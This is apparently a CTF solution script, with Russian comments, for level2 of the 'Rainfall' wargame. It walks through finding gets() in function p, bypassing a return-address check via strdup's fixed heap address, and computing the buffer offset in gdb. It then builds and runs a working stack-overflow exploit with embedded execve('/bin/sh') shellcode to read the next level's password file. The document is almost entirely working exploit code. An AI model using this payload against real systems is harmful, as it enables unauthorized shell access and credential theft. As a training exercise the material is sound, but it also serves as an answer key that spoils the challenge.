# 1. Запустить программу в дебаггере
# 2. Найти функцию p, вызываемую из main
# 3. Найти в p небезопасную функцию gets
# 4. Попробовать запустить и понять, что после gets есть проверка на то, что указатель возврата находится в куче
# 5. Но есть функция strdup, которая выделяет память и возвращает один и тот же адрес, в который записывает ввод
# 6. Взять шелл-код для запуска шелла (http://shell-storm.org/shellcode/files/shellcode-811.php)
# 7. Посчитать сдвиг, сохранить строку с шелл-кодом и адресом, куда strdup сохранил шелл-код
# 8. Запустить программу с этой строкой и получить пароль


ssh level2@"$RAINFALL_IP" -p 4242 '
    # шелл-код вызова execv("/bin/sh", NULL, NULL)
    SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
    # вычисление размера буфера в функции p
    BUF_OFFSET=$(gdb --batch -ex "break gets" -ex "run" -ex "output \$ebp - \$eax" ./level2 | awk "END{print \$3}")
    # создание нагрузки с переписанным адресом возврата
    python -c "print \"$SHELLCODE\" + \"x\" * ($BUF_OFFSET + 4 - ${#SHELLCODE} // 4) + \"\x08\xa0\x04\x08\"" > /tmp/level2
    # запуск программы с переполнением
    (cat /tmp/level2 - | ./level2) <<< "cat /home/user/level3/.pass"
'
